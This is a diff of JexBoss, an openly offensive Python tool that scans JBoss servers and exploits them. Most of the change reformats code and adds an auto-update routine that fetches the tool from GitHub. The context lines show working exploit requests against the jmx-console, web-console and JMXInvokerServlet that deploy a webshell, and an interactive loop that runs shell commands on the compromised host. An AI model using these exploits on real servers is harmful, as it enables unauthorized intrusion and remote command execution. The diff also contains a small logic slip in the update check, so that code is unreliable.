@@ -4,7 +4,7 @@
 JexBoss: Jboss verify and EXploitation Tool
 https://github.com/joaomatosf/jexboss
 
-Copyright 2016 João Filho Matos Figueiredo
+Copyright 2013 João Filho Matos Figueiredo
 
 Licensed under the Apache License, Version 2.0 (the "License");
 you may not use this file except in compliance with the License.
@@ -27,8 +27,15 @@ BOLD = '\033[1m'
 NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
+__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
+__version = "1.0.2"
+
 from sys import argv, exit, version_info
+
 from os import name, system
+import os
+import shutil
+from zipfile import ZipFile
 from time import sleep
 from random import randint
 try:
@@ -41,22 +48,18 @@ try:
     from urllib3.util.timeout import Timeout
 except ImportError:
     ver = version_info[0] if version_info[0] >= 3 else ""
-    print(RED1 +BOLD+ "\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
-          ""+GREEN+ "   Example: \n"
-                 "   # apt-get install python%s-pip ; easy_install%s urllib3\n" %(ver, ver) + ENDC)
+    print(RED1 + BOLD + "\n * Package urllib3 not installed. Please install the package urllib3 before continue.\n"
+                        "" + GREEN + "   Example: \n"
+                                     "   # apt-get install python%s-pip ; easy_install%s urllib3\n" % (ver, ver) + ENDC)
     exit(0)
 
 from urllib3 import disable_warnings, PoolManager
 from urllib3.util.timeout import Timeout
 
-__author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.0"
-
 disable_warnings()
 
-timeout = Timeout(connect=3.0, read=7.0)
+timeout = Timeout(connect=3.0, read=6.0)
 pool = PoolManager(timeout=timeout, cert_reqs='CERT_NONE')
-
 
 user_agents = ["Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0",
                "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
@@ -81,11 +84,11 @@ def get_successfully(url, path):
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
-    r = pool.request('GET', url+path, redirect=False, headers=headers)
+    r = pool.request('GET', url + path, redirect=False, headers=headers)
     result = r.status
     if result == 404:
         sleep(7)
-        r = pool.request('GET', url+path, redirect=False, headers=headers)
+        r = pool.request('GET', url + path, redirect=False, headers=headers)
         result = r.status
     return result
 
@@ -103,13 +106,13 @@ def check_vul(url):
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
     paths = {"jmx-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo",
-             "web-console" 		: "/web-console/ServerInfo.jsp",
+             "web-console" 	: "/web-console/ServerInfo.jsp",
              "JMXInvokerServlet": "/invoker/JMXInvokerServlet"}
 
     for i in paths.keys():
         try:
             print(GREEN + " * Checking %s: \t" % i + ENDC),
-            r = pool.request('HEAD', url+str(paths[i]), redirect=False, headers=headers)
+            r = pool.request('HEAD', url +str(paths[i]), redirect=False, headers=headers)
             paths[i] = r.status
             if paths[i] in (301, 302, 303, 307, 308):
                 url_redirect = r.get_redirect_location()
@@ -170,7 +173,7 @@ def shell_http(url, shell_type):
                "Connection": "keep-alive",
                "User-Agent": "jexboss"}
 
-    pool.request('GET', url+path, redirect=False, headers=headers)
+    pool.request('GET', url+ path, redirect=False, headers=headers)
 
     sleep(7)
     resp = ""
@@ -179,9 +182,9 @@ def shell_http(url, shell_type):
 
     for cmd in ['uname -a', 'cat /etc/issue', 'id']:
         cmd = urlencode({"ppp": cmd})
-        r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
+        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
         resp += " " + str(r.data).split(">")[1]
-    print(resp.replace('\\n','\n')),
+    print(resp.replace('\\n', '\n')),
 
     while 1:
         print(BLUE + "[Type commands or \"exit\" to finish]")
@@ -190,7 +193,7 @@ def shell_http(url, shell_type):
             break
 
         cmd = urlencode({"ppp": cmd})
-        r = pool.request('GET', url+path+cmd, redirect=False, headers=headers)
+        r = pool.request('GET', url + path + cmd, redirect=False, headers=headers)
         resp = str(r.data)
         if r.status == 404:
             print(RED + " * Error contacting the command shell. Try again later...")
@@ -203,7 +206,7 @@ def shell_http(url, shell_type):
         if stdout.count("An exception occurred processing JSP page") == 1:
             print(RED + " * Error executing command \"%s\". " % cmd.split("=")[1] + ENDC)
         else:
-            print(stdout.replace('\\n','\n'))
+            print(stdout.replace('\\n', '\n'))
 
 
 def exploit_jmx_console_main_deploy(url):
@@ -217,13 +220,13 @@ def exploit_jmx_console_main_deploy(url):
     payload = ("/jmx-console/HtmlAdaptor?action=invokeOp&name=jboss.system:service"
                "=MainDeployer&methodIndex=19&arg0=" + jsp)
     print(GREEN + "\n * Info: This exploit will force the server to deploy the webshell " +
-                  "\n   available at: " + jsp + ENDC)
+          "\n   available at: " + jsp + ENDC)
 
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
-    r = pool.request('HEAD', url+payload, redirect=False, headers=headers)
+    r = pool.request('HEAD', url + payload, redirect=False, headers=headers)
     return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
@@ -262,7 +265,7 @@ def exploit_jmx_console_file_repository(url):
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
-    pool.request('HEAD', url+payload, redirect=False, headers=headers)
+    pool.request('HEAD', url + payload, redirect=False, headers=headers)
     return get_successfully(url, "/jbossass/jbossass.jsp")
 
 
@@ -344,11 +347,11 @@ def exploit_jmx_invoker_file_repository(url):
                "Connection": "keep-alive",
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
-    r = pool.urlopen('POST', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
+    r = pool.urlopen('POST', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
     result = r.status
     if result == 401:
         print("   Retrying...")
-    pool.urlopen('HEAD', url+"/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
+    pool.urlopen('HEAD', url + "/invoker/JMXInvokerServlet", redirect=False, headers=headers, body=payload)
     return get_successfully(url, "/shellinvoker/shellinvoker.jsp")
 
 
@@ -398,7 +401,7 @@ def exploit_web_console_invoker(url):
         "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
         "Connection": "keep-alive",
         "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
-    r = pool.urlopen('POST', url+"/web-console/Invoker", redirect=False, headers=headers, body=payload)
+    r = pool.urlopen('POST', url + "/web-console/Invoker", redirect=False, headers=headers, body=payload)
     result = r.status
     if result == 401:
         print("   Retrying...")
@@ -439,14 +442,29 @@ def banner():
                  " | @contact: joaomatosf@gmail.com                       |\n"
                  " |                                                      |\n"
                  " | @update: https://github.com/joaomatosf/jexboss       |\n"
-                 " #______________________________________________________#\n\n")
-
+                 " #______________________________________________________#\n")
+    print(RED1 + " @version: %s\n"%__version)
 
 def main():
     """
     Run interactively. Call when the module is run by itself.
     :return: Exit code
     """
+    # check for Updates
+    updates = check_updates()
+    if updates:
+        print(BLUE + BOLD + "\n\n * An update is available and is recommended update before continuing.\n" +
+              "   Do you want to update now?")
+        pick = input("   YES/no ? ").lower() if version_info[0] >= 3 else raw_input("   YES/no ? ").lower()
+        print (ENDC)
+        if pick != "no":
+            updated = auto_update()
+            if updates:
+                print(GREEN + BOLD + "\n * The JexBoss has been successfully updated. Please run again to enjoy the updates.\n" +ENDC)
+                exit(0)
+            else:
+                print(RED + BOLD + "\n\n * An error occurred while updating the JexBoss. Please try again..\n" +ENDC)
+                exit(1)
     # check Args
     status, message = check_args(argv)
     if status == 0:
@@ -475,32 +493,32 @@ def main():
         banner()
         print(RED + " Results: potentially compromised server!" + ENDC)
         print(GREEN + " * - - - - - - -  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n"
-                       " Recommendations: \n"
-                       " - Remove web consoles and services that are not used, eg:\n"
-                       "    $ rm web-console.war\n"
-                       "    $ rm http-invoker.sar\n"
-                       "    $ rm jmx-console.war\n"
-                       "    $ rm jmx-invoker-adaptor-server.sar\n"
-                       "    $ rm admin-console.war\n"
-                       " - Use a reverse proxy (eg. nginx, apache, f5)\n"
-                       " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
-                       " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
-                       " References:\n"
-                       "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
-                       "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
-                       "\n"
-                       " - If possible, discard this server!\n"
-                       " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
+                      " Recommendations: \n"
+                      " - Remove web consoles and services that are not used, eg:\n"
+                      "    $ rm web-console.war\n"
+                      "    $ rm http-invoker.sar\n"
+                      "    $ rm jmx-console.war\n"
+                      "    $ rm jmx-invoker-adaptor-server.sar\n"
+                      "    $ rm admin-console.war\n"
+                      " - Use a reverse proxy (eg. nginx, apache, f5)\n"
+                      " - Limit access to the server only via reverse proxy (eg. DROP INPUT POLICY)\n"
+                      " - Search vestiges of exploitation within the directories \"deploy\" or \"management\".\n\n"
+                      " References:\n"
+                      "   [1] - https://developer.jboss.org/wiki/SecureTheJmxConsole\n"
+                      "   [2] - https://issues.jboss.org/secure/attachment/12313982/jboss-securejmx.pdf\n"
+                      "\n"
+                      " - If possible, discard this server!\n"
+                      " * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -*\n")
     elif list(scan_results.values()).count(505) == 0:
         print(GREEN + "\n\n * Results: \n" +
-                      "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
+              "   The server is not vulnerable to bugs tested ... :D\n\n" + ENDC)
     # infos
     print(ENDC + " * Info: review, suggestions, updates, etc: \n" +
-                 "   https://github.com/joaomatosf/jexboss\n"
-                 "   joaomatosf@gmail.com\n")
+          "   https://github.com/joaomatosf/jexboss\n"
+          "   joaomatosf@gmail.com\n")
 
     print(GREEN + BOLD + " * DONATE: " + ENDC + "Please consider making a donation to help improve this tool,\n"
-          "           including research to new versions of JBoss and zero days. \n\n" +
+                                                "           including research to new versions of JBoss and zero days. \n\n" +
           GREEN + BOLD + " * Bitcoin Address: " + ENDC + " 14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C \n" +
           GREEN + BOLD + " * URI: " + ENDC + " bitcoin:14x4niEpfp7CegBYr3tTzTn4h6DAnDCD9C?label=jexboss\n")
 
@@ -508,6 +526,95 @@ def main():
 print(ENDC)
 
 banner()
+
+
+def auto_update():
+    """
+    Download and deploy the latest version
+    :return: True if successfully updated
+    """
+    url = 'https://github.com/joaomatosf/jexboss/archive/master.zip'
+
+    # backup of prior version
+    if os.path.exists('old_version'):
+        shutil.rmtree('old_version')
+    shutil.copytree(".", "." + os.path.sep + "old_version")
+
+    # download and extract of new version
+    print(GREEN + " * Downloading the new version from %s." %url +ENDC )
+    r = pool.request('GET', url)
+    if r.status != 200:
+        print(RED + " * Error: Could not complete the download of the new version. Check your internet connection." + ENDC)
+        return False
+    with open('master.zip', 'wb') as f:
+       f.write(r.data)
+    z = ZipFile('master.zip', 'r')
+    print(GREEN + " * Extracting new version..." +ENDC)
+    z.extractall(path='.')
+    os.remove('master.zip')
+    path_new_version = '.' + os.path.sep + 'jexboss-master'
+    print(GREEN + " * Replacing the current version with the new version..."  + ENDC)
+    for root, dirs, files in os.walk(path_new_version):
+        for file in files:
+            old_path = root.replace(path_new_version, '.') + os.path.sep
+            old_file = root.replace(path_new_version, '.') + os.path.sep + file
+            new_file = os.path.join(root, file)
+
+            if not os.path.exists(old_path):
+                os.makedirs(old_path)
+
+            shutil.move(new_file, old_file)
+    # remove extracted directory of the new version
+    shutil.rmtree('.'+os.path.sep+'jexboss-master')
+
+    return True
+
+def check_updates():
+    """
+    Checks if there is new version available
+    :return: boolean if there updates
+    """
+    url = 'http://joaomatosf.com/rnp/releases.txt'
+    print(BLUE + " * Checking for updates in: %s **" % url + ENDC)
+    header = {"User-Agent": "Checking for updates"}
+    r = pool.request('GET', url, redirect=False, headers=header)
+
+    if r.status != 200:
+        print(RED + " * Error: could not check for updates ..." + ENDC)
+        return False
+    else:
+        current_version = __version
+        link = 'https://github.com/joaomatosf/jexboss/archive/master.zip'
+        date_last_version = ''
+        notes = []
+        # search for new versions
+        resp = str(r.data).replace('\\n','\n')
+        for line in resp.split('\n'):
+            if "#" in line:
+                continue
+            if 'last_version' in line:
+                last_version = line.split()[1]
+            elif 'date:' in line:
+                date_last_version = line.split()[1]
+            elif 'link:' in line:
+                link = line
+            elif '* ' in line:
+                notes.append(line)
+            elif 'version:' in line and 'last_' not in line:
+                break
+        # compare last_version with current version
+        tup = lambda x: [int(y) for y in (x + '.0.0.0').split('.')][:3]
+        if tup(last_version) > tup(current_version):
+            print (
+            GREEN + BOLD + "\n * NEW VERSION AVAILABLE: JexBoss v%s (%s)\n" % (last_version, date_last_version) + ENDC +
+            GREEN + "   * Link: %s\n" % link +
+            GREEN + "   * Release notes:")
+            for note in notes:
+                print ("      %s" % note)
+            return True
+        else:
+            return False
+
 
 if __name__ == "__main__":
     main()
